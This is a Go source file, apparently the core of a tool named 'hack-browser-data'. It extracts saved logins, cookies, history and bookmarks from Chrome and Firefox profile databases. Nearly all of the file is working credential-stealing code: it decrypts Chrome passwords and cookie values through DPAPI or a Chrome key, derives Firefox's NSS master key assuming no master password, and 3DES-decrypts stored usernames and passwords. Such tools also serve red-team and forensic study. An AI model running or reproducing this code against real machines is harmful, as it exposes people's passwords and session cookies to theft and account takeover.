package core

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"hack-browser-data/log"
	"hack-browser-data/utils"
	"io/ioutil"
	"os"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
)

const (
	bookmarkID       = "id"
	bookmarkAdded    = "date_added"
	bookmarkUrl      = "url"
	bookmarkName     = "name"
	bookmarkType     = "type"
	bookmarkChildren = "children"
)

var (
	FullData = new(BrowserData)
)

type (
	BrowserData struct {
		LoginDataSlice
		BookmarkSlice
		CookieMap
		HistorySlice
	}
	LoginDataSlice []loginData
	BookmarkSlice  []bookmarks
	CookieMap      map[string][]cookies
	HistorySlice   []history
	loginData      struct {
		UserName    string
		encryptPass []byte
		encryptUser []byte
		Password    string
		LoginUrl    string
		CreateDate  time.Time
	}
	bookmarks struct {
		ID        int64
		Name      string
		Type      string
		URL       string
		DateAdded time.Time
	}
	cookies struct {
		Host         string
		Path         string
		KeyName      string
		encryptValue []byte
		Value        string
		IsSecure     bool
		IsHTTPOnly   bool
		HasExpire    bool
		IsPersistent bool
		CreateDate   time.Time
		ExpireDate   time.Time
	}
	history struct {
		Title         string
		Url           string
		VisitCount    int
		LastVisitTime time.Time
	}
)

func ParseResult(dbname string) {
	switch dbname {
	case utils.Bookmarks:
		parseBookmarks()
	case utils.History:
		parseHistory()
	case utils.Cookies:
		parseCookie()
	case utils.LoginData:
		parseLogin()
	case utils.FirefoxCookie:
		parseFirefoxCookie()
	case utils.FirefoxKey4DB:
		parseFirefoxKey4()
	case utils.FirefoxData:
		parseFirefoxData()
	}
}

var bookmarkList BookmarkSlice

func parseBookmarks() {
	bookmarks, err := utils.ReadFile(utils.Bookmarks)
	defer os.Remove(utils.Bookmarks)
	if err != nil {
		log.Debug(err)
	}
	r := gjson.Parse(bookmarks)
	if r.Exists() {
		roots := r.Get("roots")
		roots.ForEach(func(key, value gjson.Result) bool {
			getBookmarkChildren(value)
			return true
		})
	}
	FullData.BookmarkSlice = bookmarkList
}

var queryLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`

func parseLogin() {
	var loginItemList LoginDataSlice
	login := loginData{}
	loginDB, err := sql.Open("sqlite3", utils.LoginData)
	defer os.Remove(utils.LoginData)
	defer func() {
		if err := loginDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	if err != nil {
		log.Debug(err)
	}
	err = loginDB.Ping()
	rows, err := loginDB.Query(queryLogin)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			url, username, password string
			pwd                     []byte
			create                  int64
		)
		err = rows.Scan(&url, &username, &pwd, &create)
		login = loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if utils.VersionUnder80 {
			password, err = utils.DecryptStringWithDPAPI(pwd)
		} else {
			password, err = utils.DecryptChromePass(pwd)
		}
		if create > time.Now().Unix() {
			login.CreateDate = utils.TimeEpochFormat(create)
		} else {
			login.CreateDate = utils.TimeStampFormat(create)
		}

		login.Password = password
		if err != nil {
			log.Debug(err)
		}
		loginItemList = append(loginItemList, login)
	}
	FullData.LoginDataSlice = loginItemList
}

var queryCookie = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`

func parseCookie() {
	cookie := cookies{}
	cookieMap := make(map[string][]cookies)
	cookieDB, err := sql.Open("sqlite3", utils.Cookies)
	defer os.Remove(utils.Cookies)
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	if err != nil {
		log.Debug(err)
	}
	err = cookieDB.Ping()
	rows, err := cookieDB.Query(queryCookie)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			key, host, path, value                        string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			encryptValue                                  []byte
		)
		err = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent)
		cookie = cookies{
			KeyName:      key,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     utils.IntToBool(isSecure),
			IsHTTPOnly:   utils.IntToBool(isHTTPOnly),
			HasExpire:    utils.IntToBool(hasExpire),
			IsPersistent: utils.IntToBool(isPersistent),
			CreateDate:   utils.TimeEpochFormat(createDate),
			ExpireDate:   utils.TimeEpochFormat(expireDate),
		}
		// remove prefix 'v10'
		if utils.VersionUnder80 {
			value, err = utils.DecryptStringWithDPAPI(encryptValue)
		} else {
			value, err = utils.DecryptChromePass(encryptValue)
		}

		cookie.Value = value
		if _, ok := cookieMap[host]; ok {
			cookieMap[host] = append(cookieMap[host], cookie)
		} else {
			cookieMap[host] = []cookies{cookie}
		}
	}
	FullData.CookieMap = cookieMap
}

var queryHistory = `SELECT url, title, visit_count, last_visit_time FROM urls`

func parseHistory() {
	var historyList HistorySlice
	h := history{}
	historyDB, err := sql.Open("sqlite3", utils.History)
	defer os.Remove(utils.History)
	defer func() {
		if err := historyDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	if err != nil {
		log.Debug(err)
	}
	err = historyDB.Ping()
	rows, err := historyDB.Query(queryHistory)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)
		err := rows.Scan(&url, &title, &visitCount, &lastVisitTime)
		h = history{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeEpochFormat(lastVisitTime),
		}
		if err != nil {
			log.Debug(err)
			continue
		}
		historyList = append(historyList, h)
	}
	FullData.HistorySlice = historyList
}

func getBookmarkChildren(value gjson.Result) (children gjson.Result) {
	b := bookmarks{}
	b.ID = value.Get(bookmarkID).Int()
	nodeType := value.Get(bookmarkType)
	b.DateAdded = utils.TimeEpochFormat(value.Get(bookmarkAdded).Int())
	b.URL = value.Get(bookmarkUrl).String()
	b.Name = value.Get(bookmarkName).String()
	children = value.Get(bookmarkChildren)
	if nodeType.Exists() {
		b.Type = nodeType.String()
		bookmarkList = append(bookmarkList, b)
		if children.Exists() && children.IsArray() {
			for _, v := range children.Array() {
				children = getBookmarkChildren(v)
			}
		}
	}
	return children
}

var queryFirefoxBookMarks = `SELECT id, fk, type, dateAdded, title FROM moz_bookmarks`
var queryFirefoxHistory = `SELECT id, url, title, last_visit_date, visit_count FROM moz_places`

// places.sqlite doc @https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Database
func parseFirefoxData() {
	var historyList HistorySlice
	var (
		err                       error
		keyDB                     *sql.DB
		bookmarkRows, historyRows *sql.Rows
		tempMap                   map[int64]string
		bookmarkUrl               string
	)
	tempMap = make(map[int64]string)
	keyDB, err = sql.Open("sqlite3", utils.FirefoxData)
	defer os.Remove(utils.FirefoxData)
	defer func() {
		err := keyDB.Close()
		if err != nil {
			log.Error(err)
		}
	}()
	if err != nil {
		log.Error(err)
	}
	historyRows, err = keyDB.Query(queryFirefoxHistory)
	if err != nil {
		log.Error(err)
	}

	defer func() {
		if err := historyRows.Close(); err != nil {
			log.Error(err)
		}
	}()
	for historyRows.Next() {
		var (
			id, visitDate int64
			url, title    string
			visitCount    int
		)
		err = historyRows.Scan(&id, &url, &title, &visitDate, &visitCount)
		historyList = append(historyList, history{
			Title:         title,
			Url:           url,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeStampFormat(visitDate / 1000000),
		})
		tempMap[id] = url
	}
	FullData.HistorySlice = historyList

	bookmarkRows, err = keyDB.Query(queryFirefoxBookMarks)
	defer func() {
		if err := bookmarkRows.Close(); err != nil {
			log.Error(err)
		}
	}()
	for bookmarkRows.Next() {
		var (
			id, fk, bType, dateAdded int64
			title                    string
		)
		err = bookmarkRows.Scan(&id, &fk, &bType, &dateAdded, &title)
		if url, ok := tempMap[id]; ok {
			bookmarkUrl = url
		}
		bookmarkList = append(bookmarkList, bookmarks{
			ID:        id,
			Name:      title,
			Type:      utils.BookMarkType(bType),
			URL:       bookmarkUrl,
			DateAdded: utils.TimeStampFormat(dateAdded / 1000000),
		})
	}
	FullData.BookmarkSlice = bookmarkList
}

var queryPassword = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
var queryNssPrivate = `SELECT a11, a102 from nssPrivate`

func GetDecryptKey() (b [][]byte) {
	var (
		err     error
		keyDB   *sql.DB
		pwdRows *sql.Rows
		nssRows *sql.Rows
	)
	//defer func() {
	//	if err := os.Remove(utils.FirefoxKey4DB); err != nil {
	//		log.Error(err)
	//	}
	//}()
	keyDB, err = sql.Open("sqlite3", utils.FirefoxKey4DB)
	defer func() {
		if err := keyDB.Close(); err != nil {
			log.Error(err)
		}
	}()
	if err != nil {
		log.Debug(err)
	}
	err = keyDB.Ping()
	pwdRows, err = keyDB.Query(queryPassword)
	defer func() {
		if err := pwdRows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for pwdRows.Next() {
		var (
			item1, item2 []byte
		)
		if err := pwdRows.Scan(&item1, &item2); err != nil {
			log.Error(err)
			continue
		}
		b = append(b, item1, item2)
	}
	if err != nil {
		log.Error(err)
	}
	nssRows, err = keyDB.Query(queryNssPrivate)
	defer func() {
		if err := nssRows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for nssRows.Next() {
		var (
			a11, a102 []byte
		)
		if err := nssRows.Scan(&a11, &a102); err != nil {
			log.Debug(err)
		}
		b = append(b, a11, a102)
	}
	return b
}

func parseFirefoxKey4() {
	h1 := GetDecryptKey()
	globalSalt := h1[0]
	metaBytes := h1[1]
	nssA11 := h1[2]
	nssA102 := h1[3]
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	meta, err := utils.DecodeMeta(metaBytes)
	if err != nil {
		log.Error("decrypt meta data failed", err)
		return
	}
	var masterPwd []byte
	m, err := utils.DecryptMeta(globalSalt, masterPwd, meta)
	if err != nil {
		log.Error("decrypt firefox failed", err)
		return
	}
	if bytes.Contains(m, []byte("password-check")) {
		log.Debugf("password-check success")
		m := bytes.Compare(nssA102, keyLin)
		if m == 0 {
			nss, err := utils.DecodeNss(nssA11)
			if err != nil {
				log.Error(err)
				return
			}
			log.Debugf("decrypt asn1 pbe success")
			finallyKey, err := utils.DecryptNss(globalSalt, masterPwd, nss)
			finallyKey = finallyKey[:24]
			if err != nil {
				log.Error(err)
				return
			}
			log.Debugf("finally key", finallyKey, hex.EncodeToString(finallyKey))
			allLogins := GetLoginData()
			for _, v := range allLogins {
				log.Debug(hex.EncodeToString(v.encryptUser))
				user, _ := utils.DecodeLogin(v.encryptUser)
				log.Debug(hex.EncodeToString(v.encryptPass))
				pwd, _ := utils.DecodeLogin(v.encryptPass)
				log.Debug(user, user.CipherText, user.Encrypted, user.Iv)
				u, err := utils.Des3Decrypt(finallyKey, user.Iv, user.Encrypted)
				if err != nil {
					log.Error(err)
					return
				}
				p, err := utils.Des3Decrypt(finallyKey, pwd.Iv, pwd.Encrypted)
				if err != nil {
					log.Error(err)
					return
				}
				FullData.LoginDataSlice = append(FullData.LoginDataSlice, loginData{
					LoginUrl:   v.LoginUrl,
					UserName:   string(u),
					Password:   string(p),
					CreateDate: v.CreateDate,
				})
			}
		}
	}
}

var queryFirefoxCookie = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`

func parseFirefoxCookie() {
	cookie := cookies{}
	cookieMap := make(map[string][]cookies)
	cookieDB, err := sql.Open("sqlite3", utils.FirefoxCookie)
	defer os.Remove(utils.FirefoxCookie)
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	if err != nil {
		log.Debug(err)
	}
	err = cookieDB.Ping()
	rows, err := cookieDB.Query(queryFirefoxCookie)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			name, value, host, path string
			isSecure, isHttpOnly    int
			creationTime, expiry    int64
		)
		err = rows.Scan(&name, &value, &host, &path, &creationTime, &expiry, &isSecure, &isHttpOnly)
		cookie = cookies{
			KeyName:    name,
			Host:       host,
			Path:       path,
			IsSecure:   utils.IntToBool(isSecure),
			IsHTTPOnly: utils.IntToBool(isHttpOnly),
			CreateDate: utils.TimeStampFormat(creationTime / 1000000),
			ExpireDate: utils.TimeStampFormat(expiry),
		}

		cookie.Value = value
		if _, ok := cookieMap[host]; ok {
			cookieMap[host] = append(cookieMap[host], cookie)
		} else {
			cookieMap[host] = []cookies{cookie}
		}
	}
	FullData.CookieMap = cookieMap

}

func GetLoginData() (l []loginData) {
	s, err := ioutil.ReadFile(utils.FirefoxLoginData)
	if err != nil {
		log.Warn(err)
	}
	//defer os.Remove(utils.FirefoxLoginData)
	h := gjson.GetBytes(s, "logins")
	if h.Exists() {
		for _, v := range h.Array() {
			var (
				m loginData
				u []byte
				p []byte
			)
			m.LoginUrl = v.Get("formSubmitURL").String()
			u, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			m.encryptUser = u
			if err != nil {
				log.Debug(err)
			}
			p, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			m.encryptPass = p
			m.CreateDate = utils.TimeStampFormat(v.Get("timeCreated").Int() / 1000)
			l = append(l, m)
		}
	}
	return
}
